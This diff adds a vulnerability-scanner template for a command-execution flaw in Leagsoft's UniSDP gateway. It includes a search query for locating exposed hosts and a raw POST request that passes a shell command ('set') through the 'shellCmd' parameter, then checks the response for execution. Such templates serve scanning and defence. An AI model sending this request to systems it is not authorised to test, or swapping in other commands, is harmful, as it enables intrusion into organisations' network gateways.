@@ -1,0 +1,30 @@
+id: UniSDP-commondRetStr-rce
+
+info:
+  name: UniSDP-commondRetStr-rce
+  author: msksec
+  severity: Critical
+  description: |
+    联软安界 UniSDP 软件定义边界系统命令执行
+  reference:
+    - https://github.com/Threekiii/Awesome-POC/blob/master/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E8%81%94%E8%BD%AF%E5%AE%89%E7%95%8C%20UniSDP%20%E8%BD%AF%E4%BB%B6%E5%AE%9A%E4%B9%89%E8%BE%B9%E7%95%8C%E7%B3%BB%E7%BB%9F%20commondRetSt%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    fofa-query: title="UniSSOView"
+  tags: leagsoft, UniSDP, RCE
+
+http:
+  - raw:
+    - |
+      POST /TunnelGateway/commondRetStr HTTP/1.1
+      Host: {{Hostname}}
+      Accept-Encoding: gzip, deflate
+      Content-Type: application/x-www-form-urlencoded
+
+      shellCmd=set
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'success','retString','=')
+        condition: and
